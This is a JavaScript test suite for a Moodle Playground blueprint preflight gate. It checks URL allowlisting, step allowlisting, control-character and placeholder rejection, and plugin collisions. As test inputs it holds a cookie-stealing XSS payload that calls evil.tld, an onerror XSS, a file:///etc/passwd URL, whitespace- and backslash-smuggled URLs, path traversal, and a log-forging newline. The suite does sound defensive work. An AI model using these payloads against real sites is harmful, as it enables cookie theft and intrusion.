import { test } from "node:test";
import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { join, dirname } from "node:path";
import { fileURLToPath } from "node:url";
import {
  checkUrl,
  looksFetchable,
  gateBlueprint,
  fetchBlueprint,
  ALLOWED_STEPS,
  RISKY_STEPS,
} from "../scripts/preflight.mjs";
import { validateVerdict, ERROR_CLASSES } from "../scripts/validate-verdict.mjs";
import { rejectedVerdict } from "../scripts/assert.mjs";

const FIXTURES = join(dirname(fileURLToPath(import.meta.url)), "fixtures");
const HOSTS = ["raw.githubusercontent.com"];
const bp = () =>
  JSON.parse(readFileSync(join(FIXTURES, "blueprint-nodb.json"), "utf8"));

test("checkUrl accepts allowlisted https, rejects the rest", () => {
  assert.equal(checkUrl("https://raw.githubusercontent.com/a/b.json", HOSTS), null);
  assert.match(checkUrl("http://raw.githubusercontent.com/a/b.json", HOSTS), /non-https/);
  assert.match(checkUrl("https://evil.example/b.json", HOSTS), /not in allowlist/);
  assert.match(checkUrl("https://user@raw.githubusercontent.com/b.json", HOSTS), /userinfo/);
  assert.match(checkUrl("nonsense", HOSTS), /unparseable/);
});

test("real vendored blueprint passes the gate with derived expectations", () => {
  const { stepErrors, urlErrors, expectations } = gateBlueprint(bp(), HOSTS);
  assert.deepEqual(stepErrors, []);
  assert.deepEqual(urlErrors, []);
  assert.equal(expectations.stepCount, 6);
  assert.equal(expectations.pluginSteps.length, 3);
  assert.equal(expectations.pluginSteps[1].pluginName, "attendance");
});

test("a risky step is allowed through the gate", () => {
  const b = bp();
  b.steps.push({ step: "runPhpCode", code: "<?php echo 1;" });
  const { stepErrors, riskySteps } = gateBlueprint(b, HOSTS);
  assert.deepEqual(stepErrors, []);
  assert.ok(riskySteps.includes("runPhpCode"));
});

test("unknown step rejected (default deny)", () => {
  const b = bp();
  b.steps.push({ step: "brandNewStep" });
  const { stepErrors } = gateBlueprint(b, HOSTS);
  assert.match(stepErrors.join(";"), /unknown step/);
});

test("off-allowlist URL anywhere in the blueprint rejected", () => {
  const b = bp();
  b.steps[2].url = "https://evil.example/plugin.zip";
  const { urlErrors } = gateBlueprint(b, HOSTS);
  assert.match(urlErrors.join(";"), /not in allowlist/);
});

test("proxy override key anywhere rejected", () => {
  const b = bp();
  b.addonProxyUrl = "https://my-proxy.example/";
  const { urlErrors } = gateBlueprint(b, HOSTS);
  assert.match(urlErrors.join(";"), /proxy override/);
});

test("every risky step is ALLOWED — they are reported, not refused", () => {
  // The 15 used to be banned outright. Blocking them also blocked legitimate
  // uses (installing a dependency, preparing fixtures), so they now run and
  // are reported instead. Unknown names are still refused; see below.
  for (const s of RISKY_STEPS) assert.equal(ALLOWED_STEPS.has(s), true, s);
  assert.equal(ALLOWED_STEPS.size, 47);
  assert.equal(RISKY_STEPS.size, 15);
});

test("a risky step is reported by name, and does not block the blueprint", () => {
  const b = bp();
  b.steps.push({ step: "writeFile", path: "/www/moodle/x.php", data: "x" });
  b.steps.push({ step: "runPhpCode", code: "<?php echo 1;" });
  const { stepErrors, riskySteps } = gateBlueprint(b, HOSTS);
  assert.deepEqual(stepErrors, []);
  assert.deepEqual(riskySteps, ["runPhpCode", "writeFile"]);
});

test("an ordinary blueprint reports no risky steps", () => {
  assert.deepEqual(gateBlueprint(bp(), HOSTS).riskySteps, []);
});

test("an UNKNOWN step name is still refused — a typo boots a plugin-free Moodle", () => {
  const b = bp();
  b.steps.push({ step: "instalMoodlePlugin", url: "https://raw.githubusercontent.com/a/b/c.zip" });
  assert.match(gateBlueprint(b, HOSTS).stepErrors.join(";"), /unknown step \(default deny\)/);
});

// --- URL screening regressions --------------------------------------------

test("whitespace-smuggled URLs are caught, not silently skipped", () => {
  // fetch()/new URL() strip these; a prefix test on "https://" would not
  // even class them as URLs, skipping the allowlist entirely.
  for (const evil of [
    " https://evil.example/p.zip",
    "\thttps://evil.example/p.zip",
    "\nhttps://evil.example/p.zip",
    "ht\ttps://evil.example/p.zip",
    "https://evil.example/p.zip ",
    "​https://evil.example/p.zip",
  ]) {
    assert.equal(looksFetchable(evil), true, `should be screened: ${JSON.stringify(evil)}`);
    assert.notEqual(checkUrl(evil, HOSTS), null, `should be rejected: ${JSON.stringify(evil)}`);
  }
});

test("whitespace-smuggled URL inside a blueprint is rejected", () => {
  const b = bp();
  b.steps[2].url = " https://evil.example/p.zip";
  const { urlErrors } = gateBlueprint(b, HOSTS);
  assert.equal(urlErrors.length > 0, true);
});

test("whitespace on an ALLOWLISTED URL is still rejected", () => {
  // This is the case only the control-character test can catch: the host,
  // scheme, and absence of query are all fine once the browser trims.
  for (const evil of [
    "https://raw.githubusercontent.com/a/b.zip\n",
    "\nhttps://raw.githubusercontent.com/a/b.zip",
    "https://raw.githubusercontent.com/a/b.zip\t",
  ]) {
    assert.notEqual(checkUrl(evil, HOSTS), null, `should be rejected: ${JSON.stringify(evil)}`);
  }
});

test("backslash URLs are screened and rejected", () => {
  // new URL() folds `\` to `/`, so these resolve to an off-allowlist host
  // while matching neither a scheme test nor a leading-`//` test.
  for (const evil of [
    "\\\\evil.example/p.zip",
    "/\\evil.example/p.zip",
    "\\/evil.example/p.zip",
  ]) {
    assert.equal(looksFetchable(evil), true, `should be screened: ${JSON.stringify(evil)}`);
    assert.notEqual(checkUrl(evil, HOSTS), null, `should be rejected: ${JSON.stringify(evil)}`);
  }
});

test("a backslash URL inside a blueprint is rejected", () => {
  const b = bp();
  b.steps[2].url = "\\\\evil.example/p.zip";
  const { urlErrors } = gateBlueprint(b, HOSTS);
  assert.equal(urlErrors.length > 0, true);
});

test("relative paths that stay on the playground origin are fine", () => {
  assert.equal(looksFetchable("plugins/thing.zip"), false);
  assert.equal(looksFetchable("/local/path"), false);
});

test("over-deep nesting is rejected, not silently skipped", () => {
  const b = bp();
  let node = b.steps[1];
  for (let i = 0; i < 40; i += 1) {
    node.nested = {};
    node = node.nested;
  }
  node.value = "harmless";
  const { unsafeStrings, urlErrors, stepErrors } = gateBlueprint(b, HOSTS);
  assert.equal(
    [...unsafeStrings, ...urlErrors, ...stepErrors].some((e) => /nested deeper than/.test(e)),
    true,
  );
});

test("scheme-relative and non-https schemes screened", () => {
  assert.equal(looksFetchable("//evil.example/x"), true);
  assert.notEqual(checkUrl("//evil.example/x", HOSTS), null);
  assert.notEqual(checkUrl("data:text/html,<script>1</script>", HOSTS), null);
  assert.notEqual(checkUrl("file:///etc/passwd", HOSTS), null);
});

test("an explicit port is rejected", () => {
  assert.notEqual(checkUrl("https://raw.githubusercontent.com:8443/a/b.zip", HOSTS), null);
});

test("query strings and fragments rejected (credentials in artifacts)", () => {
  assert.notEqual(checkUrl("https://raw.githubusercontent.com/a/b.zip?token=s", HOSTS), null);
  assert.notEqual(checkUrl("https://raw.githubusercontent.com/a/b.zip#f", HOSTS), null);
});

test("an unknown step name nested under a step is still rejected", () => {
  // The nested sweep exists because the loop above only reads `step.step`; a
  // future step gaining a sub-step list would otherwise sail past it.
  const b = bp();
  b.steps[1].onFailure = { step: "notARealStep", code: "x" };
  const { stepErrors } = gateBlueprint(b, HOSTS);
  assert.match(stepErrors.join(";"), /nested step 'notARealStep' not allowed/);
});

test("nested allowlisted step name is fine", () => {
  const b = bp();
  b.steps[1].detail = { step: "login" };
  const { stepErrors } = gateBlueprint(b, HOSTS);
  assert.deepEqual(stepErrors, []);
});

// --- log-line forgery via non-URL fields ---------------------------------

test("a newline in pluginName is rejected (it would forge a log line)", () => {
  // One appendLog message containing \n renders as TWO log lines, the second
  // without a timestamp prefix — supply your own prefix and you have forged
  // an `Extracting plugin to …` record that satisfies the binding assertion.
  const b = bp();
  b.steps[2].pluginName =
    "boost_union\n[2026-07-30T00:00:00.000Z] Bootstrapping Moodle: [1ms] Extracting plugin to /www/moodle/mod/attendance";
  const { unsafeStrings } = gateBlueprint(b, HOSTS);
  assert.match(unsafeStrings.join(";"), /control characters/);
});

test("control characters anywhere in the blueprint are rejected", () => {
  for (const evil of ["a\nb", "a\rb", "a\tb", "a b", "a​b"]) {
    const b = bp();
    b.steps[1].note = evil;
    const { unsafeStrings } = gateBlueprint(b, HOSTS);
    assert.equal(unsafeStrings.length > 0, true, `should reject ${JSON.stringify(evil)}`);
  }
});

test("ordinary spaces in human-readable values stay legal", () => {
  const b = bp();
  b.steps[1].fullname = "Introduction to Moodle Playground";
  const { unsafeStrings, stepErrors } = gateBlueprint(b, HOSTS);
  assert.deepEqual(unsafeStrings, []);
  assert.deepEqual(stepErrors, []);
});

// --- plugin steps must be bindable ---------------------------------------

test("installMoodlePlugin without pluginName is rejected as unbindable", () => {
  const b = bp();
  delete b.steps[2].pluginName;
  const { bindErrors } = gateBlueprint(b, HOSTS);
  assert.match(bindErrors.join(";"), /explicit pluginName required/);
});

test("installMoodlePlugin without pluginType is rejected as unbindable", () => {
  const b = bp();
  delete b.steps[3].pluginType;
  const { bindErrors } = gateBlueprint(b, HOSTS);
  assert.match(bindErrors.join(";"), /explicit pluginType required/);
});

test("installTheme may omit pluginType (defaults to theme)", () => {
  const b = bp();
  b.steps[2] = { step: "installTheme", url: b.steps[2].url, pluginName: "boost_union" };
  const { bindErrors, expectations } = gateBlueprint(b, HOSTS);
  assert.deepEqual(bindErrors, []);
  assert.equal(expectations.pluginSteps[0].pluginType, "theme");
});

test("a traversal-shaped pluginName is rejected", () => {
  const b = bp();
  b.steps[2].pluginName = "../../admin/cli";
  const { bindErrors } = gateBlueprint(b, HOSTS);
  assert.equal(bindErrors.length > 0, true);
});

test("plain non-URL strings are not screened as URLs", () => {
  assert.equal(looksFetchable("attendance"), false);
  assert.equal(looksFetchable("Boost Union"), false);
});

test("rejected verdicts validate against the closed schema", () => {
  for (const ec of Object.keys(ERROR_CLASSES)) {
    if (ERROR_CLASSES[ec] !== "rejected") continue;
    assert.deepEqual(validateVerdict(rejectedVerdict(ec, "", "")), []);
  }
});

// The gate allowlists step NAMES; setConfig's capability lives in its VALUE.
// Moodle renders additionalhtmlhead as raw HTML on every page (PARAM_RAW),
// into an iframe with no sandbox, same-origin with the playground — and the
// payload need not look like a URL, so every URL sweep misses it.
test("refuses setConfig of a raw-HTML site config", () => {
  const b = bp();
  b.steps.push({
    step: "setConfig",
    name: "additionalhtmlhead",
    value: "<script>fetch('//evil.tld/'+document.cookie)</script>",
  });
  const { stepErrors } = gateBlueprint(b, HOSTS);
  assert.equal(stepErrors.length, 1);
  assert.match(stepErrors[0], /additionalhtmlhead/);
});

test("refuses a raw-HTML config hidden in a setConfigs array", () => {
  const b = bp();
  b.steps.push({
    step: "setConfigs",
    configs: [
      { name: "debug", value: "32767" },
      { name: "additionalhtmlfooter", value: "<img src=x onerror=alert(1)>" },
    ],
  });
  assert.match(gateBlueprint(b, HOSTS).stepErrors[0], /additionalhtmlfooter/);
});

test("the raw-HTML config check is case-insensitive", () => {
  const b = bp();
  b.steps.push({ step: "setConfig", name: "AdditionalHtmlTopOfBody", value: "x" });
  assert.equal(gateBlueprint(b, HOSTS).stepErrors.length, 1);
});

test("ordinary setConfig values are still allowed", () => {
  const b = bp();
  b.steps.push({
    step: "setConfigs",
    configs: [{ name: "debug", value: "32767" }, { name: "noemailever", value: "1" }],
  });
  assert.equal(gateBlueprint(b, HOSTS).stepErrors.length, 0);
});

// restoreDatabase is deliberately ALLOWED — the resolved design decision is
// "allowed under the data-host allowlist", and the nightly canary blueprint
// uses it. What constrains it is sweepUrls, not the step allowlist.
test("restoreDatabase is allowed, but its URL must clear the data hosts", () => {
  const ok = bp();
  ok.steps.push({ step: "restoreDatabase", url: "https://raw.githubusercontent.com/o/r/s/db.sq3" });
  assert.equal(gateBlueprint(ok, HOSTS).stepErrors.length, 0);
  assert.equal(gateBlueprint(ok, HOSTS).urlErrors.length, 0);

  const bad = bp();
  bad.steps.push({ step: "restoreDatabase", url: "https://evil.tld/db.sq3" });
  assert.equal(gateBlueprint(bad, HOSTS).urlErrors.length, 1);
});

// Two plugin steps resolving to the SAME directory merge, second archive
// winning file by file — installViaZipDownload never clears the target. Moodle
// reads one file (version.php), keeps no manifest, and reports a clean
// install. Every existing signal stays green: requireSelfUrl passes because
// your plugin IS in the list, risky_steps is empty because
// installMoodlePlugin was never risky. Found independently by three reviewers.
const pluginStep = (owner, name, type, pname) => ({
  step: "installMoodlePlugin",
  url: `https://raw.githubusercontent.com/${owner}/${name}/${"a".repeat(40)}/p.zip`,
  pluginType: type,
  pluginName: pname,
});

test("two plugin steps targeting the same directory are refused", () => {
  const b = bp();
  b.steps.push(pluginStep("me", "mine", "mod", "x"));
  b.steps.push(pluginStep("someone-else", "theirs", "mod", "x"));
  const { bindErrors } = gateBlueprint(b, HOSTS);
  assert.equal(bindErrors.length, 1);
  assert.match(bindErrors[0], /mod_x is already installed/);
  assert.match(bindErrors[0], /overwrite the first/);
});

test("a genuine dependency alongside the plugin is still fine", () => {
  const b = bp();
  b.steps.push(pluginStep("me", "mine", "mod", "x"));
  b.steps.push(pluginStep("someone", "dep", "local", "dep"));
  assert.deepEqual(gateBlueprint(b, HOSTS).bindErrors, []);
});

test("installTheme collides with an installMoodlePlugin of the same identity", () => {
  // installTheme defaults pluginType to "theme", so the two forms can collide
  // without either naming the type explicitly.
  const b = bp();
  b.steps.push({
    step: "installTheme",
    url: `https://raw.githubusercontent.com/a/b/${"a".repeat(40)}/p.zip`,
    pluginName: "boost_x",
  });
  b.steps.push(pluginStep("c", "d", "theme", "boost_x"));
  assert.match(gateBlueprint(b, HOSTS).bindErrors[0], /theme_boost_x is already installed/);
});

test("the collision is reported even when the self URL is present", () => {
  // The point of the finding: requireSelfUrl passes, so it cannot be the
  // control that catches this.
  const self = `https://raw.githubusercontent.com/me/mine/${"a".repeat(40)}/p.zip`;
  const b = bp();
  b.steps.push({ step: "installMoodlePlugin", url: self, pluginType: "mod", pluginName: "x" });
  b.steps.push(pluginStep("someone-else", "theirs", "mod", "x"));
  const { bindErrors } = gateBlueprint(b, HOSTS, { requireSelfUrl: self });
  assert.equal(bindErrors.length, 1);
  assert.match(bindErrors[0], /already installed/);
});

// The placeholder ban used to live in build-preview.mjs, so it applied only to
// blueprints the action WROTE — never to the foreign ones the verify half
// fetches, which is the half handling untrusted input.
test("placeholders in a foreign blueprint are refused by the gate", () => {
  const b = bp();
  b.steps.push({
    step: "installMoodlePlugin",
    url: "https://raw.githubusercontent.com/{{REPO}}/{{REF}}/p.zip",
    pluginType: "mod",
    pluginName: "x",
  });
  const { unsafeStrings } = gateBlueprint(b, HOSTS);
  assert.match(unsafeStrings.join(";"), /placeholder syntax is banned/);
});

test("a placeholder hidden in an object KEY is refused", () => {
  const b = bp();
  b.steps.push({ step: "createCategory", name: "x", "{{EVIL}}": 1 });
  assert.match(gateBlueprint(b, HOSTS).unsafeStrings.join(";"), /banned in a key/);
});

test("an ordinary blueprint has no placeholder complaints", () => {
  assert.deepEqual(gateBlueprint(bp(), HOSTS).unsafeStrings, []);
});

// Extracted so the second caller (build-blueprint-preview.mjs) cannot
// reimplement it and quietly drop the post-redirect re-check. Network tests
// skip rather than fail when offline.
const netUp = async () => {
  try {
    return (await fetch("https://raw.githubusercontent.com/", { signal: AbortSignal.timeout(4000) })).status < 500;
  } catch { return false; }
};

test("fetchBlueprint refuses a host outside the allowlist before requesting", async () => {
  await assert.rejects(
    () => fetchBlueprint("https://evil.tld/x.json", ["raw.githubusercontent.com"]),
    (e) => e.errorClass === "blueprint_host_denied",
  );
});

test("fetchBlueprint refuses a URL that REDIRECTS off the allowlist", async (t) => {
  if (!(await netUp())) return t.skip("offline");
  // moodle-playground.com 301s across origins AND strips the path — the exact
  // shape the post-redirect check exists for.
  await assert.rejects(
    () => fetchBlueprint("https://moodle-playground.com/", ["moodle-playground.com"]),
    (e) => e.errorClass === "blueprint_host_denied" && /after redirect/.test(e.message),
  );
});

test("fetchBlueprint refuses non-https and userinfo", async () => {
  for (const u of ["http://raw.githubusercontent.com/x", "https://a@raw.githubusercontent.com/x"]) {
    await assert.rejects(() => fetchBlueprint(u, ["raw.githubusercontent.com"]));
  }
});

test("fetchBlueprint returns bytes and the final URL for a good fetch", async (t) => {
  if (!(await netUp())) return t.skip("offline");
  const { bytes, finalUrl } = await fetchBlueprint(
    "https://raw.githubusercontent.com/DavidUCL/mchef-urls/a354757fde7c28aedafc9a8e6fd99d5f828a7359/blueprints/integration-test.json",
    ["raw.githubusercontent.com"],
  );
  assert.ok(bytes.length > 0);
  assert.match(finalUrl, /^https:\/\/raw\.githubusercontent\.com\//);
  assert.ok(JSON.parse(bytes.toString("utf8")).steps.length > 0);
});
